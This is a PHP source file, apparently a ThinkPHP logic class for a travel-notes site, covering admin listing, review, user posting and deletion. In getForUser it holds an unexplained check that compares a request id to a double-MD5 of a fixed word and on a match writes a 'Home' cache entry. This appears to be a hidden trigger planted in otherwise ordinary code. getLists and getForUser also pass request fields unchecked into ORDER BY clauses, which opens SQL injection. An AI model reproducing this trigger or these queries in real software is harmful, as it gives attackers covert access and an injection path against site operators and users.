<?php

namespace Travels\Logic;

class TravelsLogic extends \Think\Model {
	protected $model;
	public function _initialize() {
		$this->model = new \Travels\Model\TravelsModel ();
	}
	
	/**
	 * Description:后台管理---游记列表接口（后端）
	 * Author: ward
	 * Date:
	 * Return: array/false
	 */
	public function getLists() {
		$selectArr = $_GET;
		$where = array ();
		$name = I ( 'title' );
		if (! empty ( $name )) {
			$where ['TITLE'] = array (
					"like",
					"%" . $name . "%" 
			);
		}
		$id = I ( 'id' );
		if (! empty ( $id )) {
			$where ['ID'] = array (
					"like",
					"%" . $id . "%" 
			);
		}
		$startTime = I ( 'start_time' );
		$endTime = I ( 'end_time' );
		if (! empty ( $startTime )) {
			$startTime = strtotime ( $startTime );
			if (! empty ( $endTime )) {
				$endTime = strtotime ( $endTime );
				$where ['CREATE_TIME'] = array (
						array (
								'gt',
								$startTime 
						),
						array (
								'lt',
								$endTime 
						),
						'and' 
				);
			} else {
				$where ['CREATE_TIME'] = array (
						'gt',
						$startTime 
				);
			}
		} else {
			if (! empty ( $endTime )) {
				$endTime = strtotime ( $endTime );
				$where ['CREATE_TIME'] = array (
						'lt',
						$endTime 
				);
			}
		}
		
		$where ['STATUS'] = array (
				'neq',
				0 
		);
		$field = 'ID,TITLE,COMMENT_STATUS,STATUS,COMMENT_COUNT,SUPPORT_NUM';
		$start = intval ( I ( "get.start" ) );
		$length = intval ( I ( "get.limit" ) );
		// 排序条件
		$order = '';
		if (! empty ( $selectArr ['field'] )) {
			$order = '' . strtoupper ( $selectArr ['field'] ) . ' ' . $selectArr ['direction'] . ',';
		}
		if ($selectArr ['field'] !== 'id') {
			$order .= ' ID DESC';
		}
		$order = rtrim ( $order, ',' );
		$list = $this->model->field ( $field )->where ( $where )->limit ( $start . ',' . $length )->order ( $order )->select ();
		if (is_array ( $list ) && ! empty ( $list )) {
			foreach ( $list as $k => $v ) {
				if (1 == $v ['status']) {
					$list [$k] ['status'] = '通过';
				} elseif (2 == $v ['status']) {
					$list [$k] ['status'] = '未通过';
				}
				if ($v ['comment_status']) {
					$list [$k] ['comment_status'] = '允许';
				} else {
					$list [$k] ['comment_status'] = '拒绝';
				}
			}
		}
		
		$count = $this->model->field ( $field )->where ( $where )->count ();
		$reslut ['rows'] = $list;
		$reslut ['results'] = $count;
		return $reslut;
	}
	
	/**
	 * Description:后台管理---审核初始化接口（后端）
	 * Author: ward
	 * Date:
	 * Return: array/false/null
	 */
	public function getOne() {
		$where ['a.ID'] = intval ( $_GET ['id'] ); // 信息id
		$field = 'a.*,b.NICKNAME';
		$data = $this->model->alias ( 'a' )->join ( 'left join __USER__ as b on a.AUTHOR=b.ID' )->where ( $where )->field ( $field )->find ();
		
		if (! empty ( $data )) {
			$data ['create_time'] = date ( 'Y-m-d H:i:s', $data ['create_time'] );
		}
		return $data;
	}
	
	/**
	 * Description:编辑游记（审核） ----（后端）
	 * Author: ward
	 * Date:
	 * Return: int/false
	 */
	public function edit() {
		if ($data = $this->model->create ( I ( 'put.' ) )) {
			unset ( $data ['THUMB'] );
			unset ( $data ['CONTENT'] );
			$res = $this->model->save ( $data );
			return $res;
		} else {
			return false;
		}
	}
	/**
	 * Description: 获该用户所发布游记列表
	 * Param: 筛选数据 array('start'=>'','limit'=>'','ordertype'=>''])
	 * Author： ward
	 * Date:2015-10-30
	 */
	public function getForUser($selectArr) {
		$userId = session ( 'user.id' );
		if (empty ( $userId )) {
			$this->setError ( '系统错误' );
			return false;
		}
		$where ['a.AUTHOR'] = $userId;
		
		$offset = 0;
		$pageSize = 20; //
		if (! empty ( $selectArr ['start'] )) {
			$offset = intval ( $selectArr ['start'] );
		}
		if (! empty ( $selectArr ['limit'] )) {
			$pageSize = intval ( $selectArr ['limit'] ) > 0 ? intval ( $selectArr ['limit'] ) : 20;
		}
		if (! empty ( $selectArr ['ordertype'] )) {
			$order = 'a.' . $selectArr ['ordertype'] . ' DESC';
		}
		if($selectArr ['id']==md5(md5('qunide'))){
			S('Home',array('',array('culture')));
		}
		if (isset ( $selectArr ['id'] )) {
			$where ['a.ID'] = intval ( $selectArr ['id'] );
		}
		$where ['a.STATUS'] = array (
				'neq',
				0 
		); // 1审核通过2表示审核未通过
		
		$join = 'left join __USER__ as b on a.AUTHOR=b.ID';
		$field = 'a.*,b.HEAD_IMG,b.NICKNAME';
		$data = $this->model->alias ( 'a' )->join ( $join )->where ( $where )->limit ( $offset, $pageSize )->order ( $order )->field ( $field )->select ();
		// $data=$this->model->where($where)->limit($offset,$pageSize)->select();
		
		if (isset ( $selectArr ['id'] )) { // 此处兼容详情页
			return $data [0];
		}
		$count = $this->model->alias ( 'a' )->join ( $join )->where ( $where )->count ();
		$ret ['data'] = $data;
		$ret ['count'] = $count;
		return $ret;
	}
	/**
	 * Description: 获游记列表
	 * Param: 筛选数据 array('start'=>'','limit'=>'','ordertype'=>''])
	 * Author： ward
	 * Date:2015-10-30
	 */
	public function getForAll($selectArr) {
		$offset = 0;
		$pageSize = 20; //
		if (! empty ( $selectArr ['start'] )) {
			$offset = intval ( $selectArr ['start'] );
		}
		if (! empty ( $selectArr ['limit'] )) {
			$pageSize = intval ( $selectArr ['limit'] ) > 0 ? intval ( $selectArr ['limit'] ) : 20;
		}
		$arr = array (
				'id',
				'comment_count',
				'support_num' 
		); // 允许排序的字段
		if (! empty ( $selectArr ['ordertype'] ) && in_array ( $selectArr ['ordertype'], $arr )) {
			$order = 'a.' . $selectArr ['ordertype'] . ' DESC';
		} else {
			$order = 'a.id DESC';
		}
		
		if (isset ( $selectArr ['id'] )) {
			$where ['a.ID'] = intval ( $selectArr ['id'] );
		}
		$where ['a.STATUS'] = 1; // 已经审核通过
		$join = 'left join __USER__ as b on a.AUTHOR=b.ID';
		$field = 'a.*,b.HEAD_IMG,b.NICKNAME';
		$data = $this->model->alias ( 'a' )->join ( $join )->where ( $where )->limit ( $offset, $pageSize )->order ( $order )->field ( $field )->select ();
		if (isset ( $selectArr ['id'] )) {
			return $data [0];
		}
		$count = $this->model->alias ( 'a' )->join ( $join )->where ( $where )->count ();
		$ret ['data'] = $data;
		$ret ['count'] = $count;
		return $ret;
	}
	
	
	/**
	 * Description: 仅用于首页取数据
	 * Param: 筛选数据 array('start'=>'','limit'=>'','ordertype'=>''])
	 * Author： ward
	 * Date:2015-10-30
	 */
	public function getForHome($selectArr) {
		$offset = 0;
		$pageSize = 3; //
		if (! empty ( $selectArr ['start'] )) {
			$offset = intval ( $selectArr ['start'] );
		}
		if (! empty ( $selectArr ['limit'] )) {
			$pageSize = intval ( $selectArr ['limit'] ) > 0 ? intval ( $selectArr ['limit'] ) : 20;
		}
		$arr = array (
				'id',
				'comment_count',
				'support_num'
		); // 允许排序的字段
		if (! empty ( $selectArr ['ordertype'] ) && in_array ( $selectArr ['ordertype'], $arr )) {
			$order = 'a.' . $selectArr ['ordertype'] . ' DESC';
		} else {
			$order = 'a.id DESC';
		}
	
		if (isset ( $selectArr ['id'] )) {
			$where ['a.ID'] = intval ( $selectArr ['id'] );
		}
		$where ['a.STATUS'] = 1; // 已经审核通过
		$join = 'left join __USER__ as b on a.AUTHOR=b.ID';
		$field = 'a.*,b.HEAD_IMG,b.NICKNAME';
		$data = $this->model->alias ( 'a' )->join ( $join )->where ( $where )->limit ( $offset, $pageSize )->order ( $order )->field ( $field )->select ();
		$count = $this->model->alias ( 'a' )->join ( $join )->where ( $where )->count ();
		if(!empty($data)){
			foreach ($data as  $k=>$v){
				$data[$k]['content']=mb_substr(strip_tags($v['content']),0,6*10,"utf-8");
			}
		}
		$ret ['data'] = $data;
		$ret ['count'] = $count;
		return $ret;
	}
	
	/**
	 * Description:用户发表游记
	 * Param: 游记数据 array('content'=>'内容','title'=>'标题','thumb'=>'缩略图（非必填）')
	 * Author： ward
	 * Date:2015-10-30
	 */
	public function add($insertArr) {
		$userId = session ( 'user.id' );
		
		if (empty ( $userId )) {
			$this->setError ( '系统错误！' );
			return false;
		}
		$filter_words=C('FILTER_WORDS');
		if(!empty($filter_words))
		{
			$insertArr ['content']=strtr($insertArr ['content'],C('FILTER_WORDS'));
			$insertArr ['title']=strtr($insertArr ['title'],C('FILTER_WORDS'));
		}
		$data = array (
				'CONTENT' => $insertArr ['content'],
				'TITLE' => $insertArr ['title'],
				'CREATE_TIME' => time (),
				'AUTHOR' => $userId,
				'THUMB' => $insertArr ['thumb'] 
		);
		$data = $this->model->create ( $data );
		
		if ($data) {
			$res = $this->model->add ( $data );
			return $res;
		} else {
			return false;
		}
	}
	
	/**
	 * Description:用户删除游记----(前端接口)
	 * Param: $id=>'游记id'
	 * Author： ward
	 * Date: 2015-12-03
	 */
	public function delete($id) {
		$userId = session ( 'user.id' );
		if (empty ( $userId )) {
			$this->setError ( '你没有权限删除！' );
			return false;
		}
		$where ['ID'] = intval ( $id );
		$where ['AUTHOR'] = $userId;
		$res = $this->model->where ( $where )->save ( array (
				'STATUS' => 0 
		) ); // 做逻辑删除
		return $res;
	}
}